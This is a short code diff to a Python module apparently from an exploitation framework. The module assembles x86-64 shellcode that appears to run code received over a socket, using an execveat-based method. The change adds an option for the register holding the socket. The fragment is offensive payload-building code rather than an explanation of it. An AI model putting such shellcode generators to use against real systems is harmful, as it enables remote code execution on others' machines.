@@ -29,6 +29,8 @@ class PawnModule(Module, Assembler):
         self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
         self.obsolete = BooleanOption('no', 'Use obsolete method (no execveat).', True)
 
+        self.sock = Option('rdi', 'Register in which sock is located.', True, True)
+
     def run(self):
         if self.length.value:
             payload = dedent(f"""\
@@ -44,6 +46,15 @@ class PawnModule(Module, Assembler):
                 push 0x0
                 lea  rsi, [rsp]
                 xor  rax, rax
+            """)
+
+            if self.sock.value != 'rdi':
+                payload += dedent(f"""\
+                    push {self.sock.value}
+                    pop rdi
+                """)
+
+            payload += dedent(f"""
                 syscall
             """)
 
@@ -53,7 +64,7 @@ class PawnModule(Module, Assembler):
                     js   fail
                 """)
 
-        payload += dedent("""\
+        payload += dedent(f"""\
             pop  r12
             push rdi
             pop  r13
